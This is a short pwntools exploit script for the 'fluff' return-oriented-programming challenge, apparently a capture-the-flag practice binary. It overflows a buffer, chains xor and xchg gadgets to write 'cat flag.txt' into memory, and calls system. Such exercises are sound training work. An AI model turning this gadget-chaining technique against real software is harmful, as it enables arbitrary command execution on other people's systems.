import pwn

# Setup enviroment
process = pwn.process("./fluff")
pwn.context(os="linux", arch="amd64")
elf = pwn.ELF("fluff")
data_section = elf.bss()
system_arg = "cat flag.txt"

def pad_input(inp):
    return inp + 8 * "\x00" if len(inp) % 8 == 0 else  inp + (8-(len(inp)%8)) * "\x00"

def write_to_location(inp, loc):
    inp = pad_input(inp)

    return "".join([pwn.p64(elf.symbols["questionableGadgets"]+2) +     # xor r11, r11; pop r14; mov edi, 0x601050; ret;
                    "A" * 8 +
                    pwn.p64(elf.symbols["questionableGadgets"]+18) +    # pop r12; mov r13d, 0x604060; ret;
                    pwn.p64(loc+i) +
                    pwn.p64(elf.symbols["questionableGadgets"]+15) +    # xor r11, r12; pop r12 ; mov r13d, 0x604060; ret;
                    "A" * 8 +
                    pwn.p64(elf.symbols["questionableGadgets"]+32) +    # xchg r11, r10; pop r15; mov r11d, 0x602050; ret;
                    "A" * 8 +
                    pwn.p64(elf.symbols["questionableGadgets"]+2) +     # xor r11, r11; pop r14; mov edi, 0x601050; ret;
                    "A" * 8 +
                    pwn.p64(elf.symbols["questionableGadgets"]+18) +    # pop r12; mov r13d, 0x604060; ret;
                    inp[i:i+8] +
                    pwn.p64(elf.symbols["questionableGadgets"]+15) +    # xor r11, r12 ; pop r12 ; mov  r13d, 0x604060; ret;
                    "A" * 8 +
                    pwn.p64(elf.symbols["questionableGadgets"]+45) +    # pop r15; mov r10, r11; pop r13; pop r12; xor r10 ,r12b; ret;
                    "A" * 16 +
                    pwn.p64(0)
                    for i in range(0, len(inp), 8)])

payload = "A" * 40
payload += write_to_location(system_arg, data_section)
payload += pwn.p64(elf.symbols["__libc_csu_init"] + 99)     # pop rdi; ret;
payload += pwn.p64(data_section)
payload += pwn.p64(elf.symbols["system"])
print payload

process.readline()
process.readline()
process.readline()
process.readline()
process.sendline(payload)
print process.readline()[2:]
